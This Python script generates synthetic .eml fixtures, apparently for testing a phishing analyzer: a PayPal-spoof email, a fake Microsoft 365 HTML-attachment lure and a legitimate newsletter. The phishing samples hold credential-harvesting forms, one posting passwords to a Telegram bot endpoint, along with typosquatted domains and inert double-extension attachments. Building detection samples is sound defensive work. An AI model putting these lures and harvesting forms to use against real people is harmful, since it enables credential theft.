"""Regenerate the sample .eml files in this folder.

All samples are synthetic and harmless: the "executable" is just an MZ header
followed by text, and every domain is fictional or reserved.

    python samples/generate_samples.py
"""

from __future__ import annotations

import io
import os
import zipfile
from email.message import EmailMessage

HERE = os.path.dirname(os.path.abspath(__file__))


def phishing_paypal() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = "from mx.recipient.example ([10.0.0.5]) by inbox.recipient.example; Mon, 28 Sep 2026 09:14:03 +0000"
    m["Received"] = ("from paypa1-support.com (unknown [185.220.101.47]) by mx.recipient.example "
                     "with ESMTP id 4F2A1; Mon, 28 Sep 2026 09:14:01 +0000")
    m["Authentication-Results"] = ("mx.recipient.example; spf=fail smtp.mailfrom=bulk-sender.ru; "
                                   "dkim=none; dmarc=fail header.from=paypa1-support.com")
    m["Return-Path"] = "<bounce@bulk-sender.ru>"
    m["From"] = '"PayPal Security (service@paypal.com)" <security@paypa1-support.com>'
    m["Reply-To"] = "paypal.resolution.center@gmail.com"
    m["To"] = "victim@recipient.example"
    m["Subject"] = "Urgent: Your account has been suspended"
    m["Date"] = "Mon, 28 Sep 2026 09:13:58 +0000"
    m["Message-ID"] = "<a81f2c@mailer.bulk-sender.ru>"
    m["X-Mailer"] = "PHPMailer 6.8.0"
    m.set_content(
        "Dear Customer,\n\nWe detected unusual sign-in activity. Your account will be suspended within 24 hours.\n"
        "Verify your account immediately: http://paypa1-secure.xyz/login/verify.php\n\nPayPal Security Team\n")
    m.add_alternative("""<html><body>
<p>Dear Customer,</p>
<p>We detected <b>unusual sign-in activity</b>. Your account will be suspended within 24 hours.</p>
<p><a href="http://paypa1-secure.xyz/login/verify.php?session=8812">https://www.paypal.com/signin</a></p>
<p>Or use our <a href="https://bit.ly/3xYzPay">secure portal</a> or
<a href="http://185.220.101.47/paypal/webscr/index.php">backup server</a>.</p>
<p><a href="https://www.google.com/url?q=https://paypal-account-review.web.app/auth">Review activity</a></p>
<form action="https://paypa1-secure.xyz/collect.php" method="post">
  Email <input name="email"> Password <input type="password" name="pw"> <input type="submit">
</form>
<p>PayPal Security Team</p></body></html>""", subtype="html")
    m.add_attachment(b"MZ\x90\x00 harmless sample - not a real executable", maintype="application",
                     subtype="octet-stream", filename="Invoice_8812.pdf.exe")
    return m


def html_attachment_lure() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from smtp.mail-relay.example (relay [203.0.113.77]) by mx.corp.example; "
                     "Tue, 29 Sep 2026 14:02:11 +0000")
    m["Authentication-Results"] = "mx.corp.example; spf=softfail smtp.mailfrom=docs-share.top; dkim=none; dmarc=none"
    m["From"] = '"Microsoft 365" <no-reply@docs-share.top>'
    m["To"] = "finance@corp.example"
    m["Subject"] = "RE: Remittance advice - payment pending"
    m["Date"] = "Tue, 29 Sep 2026 14:02:05 +0000"
    m["Message-ID"] = "<x1@docs-share.top>"
    m.set_content("Hello,\n\nPlease find the attached remittance. Kindly confirm your password to open the "
                  "secure document. Outstanding invoice must be paid as soon as possible.\n")
    page = b"""<!DOCTYPE html><html><head><title>Microsoft Online</title></head><body>
<form action="https://api.telegram.org/bot123456:ABC/sendMessage"><input type="email" name="u">
<input type="password" name="p"></form>
<script>var d=atob("UEsDBA==");var b=new Blob([d]);var u=URL.createObjectURL(b);
window.location.href="https://login.rnicrosoftonline.com/common/oauth2";</script></body></html>"""
    m.add_attachment(page, maintype="text", subtype="html", filename="Remittance_Advice.html")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Payment_Details.docx.js", "WScript.Echo('harmless sample');")
        z.writestr("readme.txt", "sample")
    m.add_attachment(buf.getvalue(), maintype="application", subtype="zip", filename="Payment.zip")
    return m


def legitimate_newsletter() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from mail-out.example.com (mail-out.example.com [93.184.216.34]) by mx.recipient.example; "
                     "Wed, 30 Sep 2026 08:00:02 +0000")
    m["Authentication-Results"] = ("mx.recipient.example; spf=pass smtp.mailfrom=example.com; "
                                   "dkim=pass header.d=example.com; dmarc=pass header.from=example.com")
    m["DKIM-Signature"] = "v=1; a=rsa-sha256; d=example.com; s=mail; h=from:to:subject; bh=abc=; b=def="
    m["Return-Path"] = "<bounces@example.com>"
    m["From"] = '"Example Weekly" <news@example.com>'
    m["To"] = "reader@recipient.example"
    m["Subject"] = "Your weekly product update"
    m["Date"] = "Wed, 30 Sep 2026 08:00:00 +0000"
    m["Message-ID"] = "<weekly-2026-40@example.com>"
    m.set_content("Hi Alex,\n\nHere is what changed this week: https://www.example.com/changelog\n\n"
                  "Unsubscribe: https://www.example.com/unsubscribe\n")
    m.add_alternative("""<html><body><p>Hi Alex,</p>
<p>Here is <a href="https://www.example.com/changelog">what changed this week</a>.</p>
<p><a href="https://www.example.com/unsubscribe">www.example.com/unsubscribe</a></p></body></html>""",
                      subtype="html")
    m.add_attachment(b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
                     b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
                     b"3 0 obj << /Type /Page /Parent 2 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n",
                     maintype="application", subtype="pdf", filename="release-notes.pdf")
    return m


SAMPLES = {
    "phishing_paypal.eml": phishing_paypal,
    "phishing_html_attachment.eml": html_attachment_lure,
    "legitimate_newsletter.eml": legitimate_newsletter,
}

if __name__ == "__main__":
    for name, build in SAMPLES.items():
        with open(os.path.join(HERE, name), "wb") as fh:
            fh.write(bytes(build()))
        print("wrote", name)
